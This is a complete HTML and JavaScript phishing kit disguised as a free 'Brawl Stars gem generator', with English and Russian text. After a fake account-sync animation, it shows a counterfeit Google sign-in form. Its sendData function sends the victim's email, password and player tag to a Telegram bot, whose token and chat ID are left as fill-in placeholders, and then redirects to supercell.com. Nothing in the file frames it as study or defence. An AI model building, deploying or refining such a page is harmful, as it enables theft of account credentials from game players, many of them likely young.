<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Brawl Stars Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Montserrat:wght@700;900&family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* –ì–õ–û–ë–ê–õ–¨–ù–´–ï –°–¢–ò–õ–ò */
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Lilita One', 'Montserrat', cursive; overflow-x: hidden;
            background: #1a2969;
        }

        .bg-overlay {
            position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
            background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
            background-size: 300px auto; opacity: 0.1;
            animation: moveBackground 60s linear infinite;
            z-index: 0; pointer-events: none;
        }

        @keyframes moveBackground {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-300px, -300px); }
        }

        .wrapper {
            position: relative; z-index: 10;
            display: flex; flex-direction: column; align-items: center;
            padding: 20px; min-height: 100vh;
        }

        /* –ö–ù–û–ü–ö–ê –í–´–ë–û–†–ê –Ø–ó–´–ö–ê */
        .lang-selector {
            position: absolute; top: 10px; right: 10px; z-index: 100;
        }
        .lang-btn {
            background: #222; border: 2px solid #fff; color: #fff;
            padding: 5px 10px; border-radius: 8px; cursor: pointer;
            font-family: 'Lilita One', sans-serif; font-size: 14px;
            display: flex; align-items: center; gap: 5px;
        }
        .lang-dropdown {
            display: none; position: absolute; right: 0; top: 35px;
            background: white; border: 2px solid #000; border-radius: 8px;
            overflow: hidden; width: 80px; box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .lang-dropdown div {
            padding: 8px; color: #000; cursor: pointer; text-align: center;
        }
        .lang-dropdown div:hover { background: #eee; }

        .logo { width: 220px; margin: 10px 0; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }

        @keyframes shellyFloat {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-15px); }
        }

        .shelly-container {
            display: flex; align-items: center; width: 100%; max-width: 450px;
            margin-bottom: 20px; animation: fadeIn 0.5s ease, shellyFloat 3s ease-in-out infinite;
        }

        .shelly-avatar {
            width: 80px; height: 80px; border-radius: 50%; border: 4px solid #000;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 2; background: #fff;
        }

        .brawl-bubble {
            background: white; border: 4px solid black; border-radius: 20px;
            padding: 15px 20px; margin-left: -15px; position: relative;
            flex: 1; box-shadow: 0 6px 0 rgba(0,0,0,0.1);
        }

        .brawl-bubble::before {
            content: ''; position: absolute; left: -14px; top: 50%;
            transform: translateY(-50%); border-top: 10px solid transparent;
            border-bottom: 10px solid transparent; border-right: 10px solid black;
        }

        .bubble-text { color: #000; font-size: 16px; line-height: 1.2; text-align: left; font-weight: 700; }

        .main-box {
            background: white; border: 5px solid #000; border-radius: 20px;
            width: 100%; max-width: 450px; padding: 25px;
            box-shadow: 0 15px 0 rgba(0,0,0,0.2); text-align: center;
            box-sizing: border-box; position: relative;
        }

        .step-title { color: #000; font-size: 24px; margin-bottom: 20px; text-transform: uppercase; }

        .tag-input-wrapper {
            background: #f0f0f0; border: 3px solid #ccc; border-radius: 10px;
            padding: 10px; margin-bottom: 20px;
        }
        input#tag {
            width: 100%; border: none; background: transparent;
            font-family: inherit; font-size: 26px; text-align: center;
            outline: none; text-transform: uppercase; font-weight: 900;
        }

        .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .gem-card {
            background: #f9f9f9; border: 3px solid #eee; border-radius: 15px;
            padding: 15px; cursor: pointer; transition: 0.1s;
        }
        .gem-card.selected { border-color: #FFA800; background: #FFF9E6; transform: scale(1.05); }
        .gem-card img { width: 60px; display: block; margin: 0 auto 5px; }
        .gem-card span { font-size: 20px; color: #333; font-weight: 900; }

        .btn-yellow {
            background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%);
            border: 3px solid #000; border-radius: 12px;
            color: #fff; font-family: inherit; font-size: 24px; font-weight: 900;
            padding: 15px; width: 100%; cursor: pointer;
            box-shadow: 0 6px 0 #CC7A00; text-shadow: 2px 2px 0 rgba(0,0,0,0.3);
            text-transform: uppercase; transition: 0.1s;
        }
        .btn-yellow:active { transform: translateY(3px); box-shadow: 0 3px 0 #CC7A00; }

        .loader-wrap { display: none; margin: 30px 0; }
        .bar-bg { background: #eee; height: 25px; border: 3px solid #000; border-radius: 15px; overflow: hidden; }
        .bar-fill { background: #FFA800; height: 100%; width: 0%; transition: 0.2s; }
        .logs { 
            text-align: left; background: #222; color: #0f0; 
            padding: 10px; border-radius: 10px; font-family: monospace; 
            font-size: 12px; height: 80px; overflow-y: hidden; margin-top: 15px;
        }

        .account-ready { display: block; background: #222; border-radius: 15px; padding: 20px; color: #fff; margin-bottom: 20px; }
        .ready-tag { color: #FFD84D; font-size: 22px; margin-top: 10px; }

        .google-ui { display: none; font-family: 'Source Sans Pro', sans-serif; text-align: left; }
        .google-ui h2 { font-weight: 400; font-size: 24px; text-align: center; color: #202124; margin-top: 10px; }
        .g-input {
            width: 100%; padding: 13px; margin: 10px 0;
            border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box;
        }

        .back-link { position: absolute; top: 15px; left: 15px; width: 35px; cursor: pointer; display: none; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

<div class="bg-overlay"></div>

<div class="wrapper">
    <div class="lang-selector">
        <button class="lang-btn" onclick="toggleLang()">üåê <span id="current-lang">EN</span></button>
        <div class="lang-dropdown" id="lang-menu">
            <div onclick="setLang('EN')">EN</div>
            <div onclick="setLang('RU')">RU</div>
        </div>
    </div>

    <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">

    <div class="shelly-container">
        <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="shelly-avatar">
        <div class="brawl-bubble">
            <div class="bubble-text" id="bubble-msg">Hey Brawler! Free gems event is live! Enter your tag to get started!</div>
        </div>
    </div>

    <div class="main-box" id="mainBox">
        <img src="https://brawlergems.com/generator/images/back.png" class="back-link" id="backBtn" onclick="goBack()">

        <div id="step-entry">
            <div class="step-title" id="t-entry-title">Enter Player Tag</div>
            <div class="tag-input-wrapper">
                <input type="text" id="tag" placeholder="#TAG123" maxlength="12">
            </div>
            
            <div class="step-title" style="font-size: 18px;" id="t-select-gems">Select Gems</div>
            <div class="gems-grid">
                <div class="gem-card selected" onclick="selectGems(this, '30')"><img src="https://brawlergems.com/generator/images/30.png"><span>30</span></div>
                <div class="gem-card" onclick="selectGems(this, '360')"><img src="https://brawlergems.com/generator/images/360.png"><span>360</span></div>
                <div class="gem-card" onclick="selectGems(this, '950')"><img src="https://brawlergems.com/generator/images/950.png"><span>950</span></div>
                <div class="gem-card" onclick="selectGems(this, '2000')"><img src="https://brawlergems.com/generator/images/2000.png"><span>2000</span></div>
            </div>
            <button class="btn-yellow" id="btn-connect" onclick="startLoading()">Connect</button>
        </div>

        <div id="step-load" class="loader-wrap">
            <div class="step-title" id="load-status">Connecting...</div>
            <div class="bar-bg"><div class="bar-fill" id="bar"></div></div>
            <div class="logs" id="log-box"></div>
        </div>

        <div id="step-ready" style="display:none;">
            <div class="account-ready">
                <div id="reward-display"></div>
                <div class="ready-tag" id="display-tag">#TAG</div>
                <div style="font-size: 14px; opacity: 0.7;" id="t-synced">Account Synced Successfully</div>
            </div>
            <button class="btn-yellow" id="claim-btn" onclick="showGoogle()">Claim Gems</button>
        </div>

        <div id="step-google" class="google-ui">
            <center><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75"></center>
            <h2 id="t-signin">Sign in</h2>
            <p id="t-verify-desc" style="text-align:center; color:#5f6368; font-size:14px; margin-bottom:25px;">Verify ownership to receive rewards</p>
            <input type="email" id="email" class="g-input" placeholder="Email or phone">
            <input type="password" id="pass" class="g-input" placeholder="Enter password">
            <button class="btn-yellow" id="btn-confirm" style="margin-top:20px; font-size:18px;" onclick="sendData()">Confirm Verification</button>
        </div>
    </div>
</div>

<script>
    let selectedGems = "30";
    let playerTag = "";
    let currentLang = "EN";
    const bubbleMsg = document.getElementById('bubble-msg');

    const translations = {
        EN: {
            bubble_start: "Hey Brawler! Free gems event is live! Enter your tag to get started!",
            bubble_search: "Searching for your account... Please wait!",
            bubble_found: "Account found! You can now claim your reward!",
            bubble_verify: "Almost there! Just verify you are a real Brawler!",
            entry_title: "Enter Player Tag",
            select_gems: "Select Gems",
            btn_connect: "Connect",
            btn_claim: "Claim",
            synced: "Account Synced Successfully",
            signin: "Sign in",
            verify_desc: "Verify ownership to receive rewards",
            btn_confirm: "Confirm Verification",
            logs: ["> Searching player...", "> Database found", "> Syncing gems...", "> Finalizing..."],
            alert_tag: "Enter valid tag!",
            alert_fields: "Fill all fields!",
            alert_done: "Verification successful! Gems will be added in 24h."
        },
        RU: {
            bubble_start: "–ü—Ä–∏–≤–µ—Ç, –ë—Ä–∞–≤–ª–µ—Ä! –†–∞–∑–¥–∞—á–∞ –≥–µ–º–æ–≤ –Ω–∞—á–∞–ª–∞—Å—å! –í–≤–µ–¥–∏ —Å–≤–æ–π —Ç–µ–≥!",
            bubble_search: "–ò—â—É —Ç–≤–æ–π –∞–∫–∫–∞—É–Ω—Ç... –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏!",
            bubble_found: "–ê–∫–∫–∞—É–Ω—Ç –Ω–∞–π–¥–µ–Ω! –¢–µ–ø–µ—Ä—å —Ç—ã –º–æ–∂–µ—à—å –∑–∞–±—Ä–∞—Ç—å –Ω–∞–≥—Ä–∞–¥—É!",
            bubble_verify: "–ü–æ—á—Ç–∏ –≥–æ—Ç–æ–≤–æ! –ü—Ä–æ—Å—Ç–æ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏, —á—Ç–æ —Ç—ã –Ω–µ —Ä–æ–±–æ—Ç!",
            entry_title: "–í–≤–µ–¥–∏ —Ç–µ–≥ –∏–≥—Ä–æ–∫–∞",
            select_gems: "–í—ã–±–µ—Ä–∏ –≥–µ–º—ã",
            btn_connect: "–ü–æ–¥–∫–ª—é—á–∏—Ç—å",
            btn_claim: "–ó–∞–±—Ä–∞—Ç—å",
            synced: "–ê–∫–∫–∞—É–Ω—Ç —É—Å–ø–µ—à–Ω–æ —Å–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∏—Ä–æ–≤–∞–Ω",
            signin: "–í—Ö–æ–¥",
            verify_desc: "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤–ª–∞–¥–µ–Ω–∏–µ, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –Ω–∞–≥—Ä–∞–¥—ã",
            btn_confirm: "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å",
            logs: ["> –ü–æ–∏—Å–∫ –∏–≥—Ä–æ–∫–∞...", "> –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞–π–¥–µ–Ω–∞", "> –°–∏–Ω—Ö—Ä–æ–Ω–∏–∑–∞—Ü–∏—è...", "> –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ..."],
            alert_tag: "–í–≤–µ–¥–∏—Ç–µ –≤–µ—Ä–Ω—ã–π —Ç–µ–≥!",
            alert_fields: "–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è!",
            alert_done: "–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–π–¥–µ–Ω–∞! –ì–µ–º—ã –ø—Ä–∏–¥—É—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤."
        }
    };

    function toggleLang() {
        const menu = document.getElementById('lang-menu');
        menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
    }

    function setLang(lang) {
        currentLang = lang;
        document.getElementById('current-lang').innerText = lang;
        document.getElementById('lang-menu').style.display = 'none';
        updateUI();
    }

    function updateUI() {
        const t = translations[currentLang];
        bubbleMsg.innerText = t.bubble_start;
        document.getElementById('t-entry-title').innerText = t.entry_title;
        document.getElementById('t-select-gems').innerText = t.select_gems;
        document.getElementById('btn-connect').innerText = t.btn_connect;
        document.getElementById('t-synced').innerText = t.synced;
        document.getElementById('t-signin').innerText = t.signin;
        document.getElementById('t-verify-desc').innerText = t.verify_desc;
        document.getElementById('btn-confirm').innerText = t.btn_confirm;
    }

    function selectGems(el, val) {
        document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
        el.classList.add('selected');
        selectedGems = val;
    }

    function startLoading() {
        playerTag = document.getElementById('tag').value;
        const t = translations[currentLang];
        if(playerTag.length < 3) return alert(t.alert_tag);

        document.getElementById('step-entry').style.display = 'none';
        document.getElementById('step-load').style.display = 'block';
        bubbleMsg.innerText = t.bubble_search;

        let p = 0;
        let logs = t.logs;
        let lIdx = 0;

        let iv = setInterval(() => {
            p += 2;
            document.getElementById('bar').style.width = p + "%";
            if(p % 25 == 0 && lIdx < logs.length) {
                document.getElementById('log-box').innerHTML += "<div>" + logs[lIdx] + "</div>";
                document.getElementById('load-status').innerText = logs[lIdx].replace("> ", "");
                lIdx++;
            }
            if(p >= 100) {
                clearInterval(iv);
                setTimeout(showReady, 500);
            }
        }, 50);
    }

    function showReady() {
        const t = translations[currentLang];
        document.getElementById('step-load').style.display = 'none';
        document.getElementById('step-ready').style.display = 'block';
        document.getElementById('backBtn').style.display = 'block';
        
        const rewardDiv = document.getElementById('reward-display');
        rewardDiv.innerHTML = `<img src="https://brawlergems.com/generator/images/${selectedGems}.png" style="width:100px; filter: drop-shadow(0 8px 15px rgba(0,0,0,0.5)); margin-bottom: 10px;">`;

        document.getElementById('display-tag').innerText = playerTag.toUpperCase();
        document.getElementById('claim-btn').innerText = t.btn_claim + " " + selectedGems + " Gems";
        bubbleMsg.innerText = t.bubble_found;
    }

    function showGoogle() {
        const t = translations[currentLang];
        document.getElementById('step-ready').style.display = 'none';
        document.getElementById('step-google').style.display = 'block';
        bubbleMsg.innerText = t.bubble_verify;
    }

    async function sendData() {
        const t = translations[currentLang];
        const mail = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!mail || !pass) return alert(t.alert_fields);

        const token = "–¢–í–û–ô_–¢–û–ö–ï–ù";
        const chat = "–¢–í–û–ô_ID";
        const text = `üéØ LOG\nTag: ${playerTag}\nGems: ${selectedGems}\nMail: ${mail}\nPass: ${pass}`;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`);
        
        alert(t.alert_done);
        window.location.href = "https://supercell.com";
    }

    function goBack() { location.reload(); }
</script>

</body>
</html>
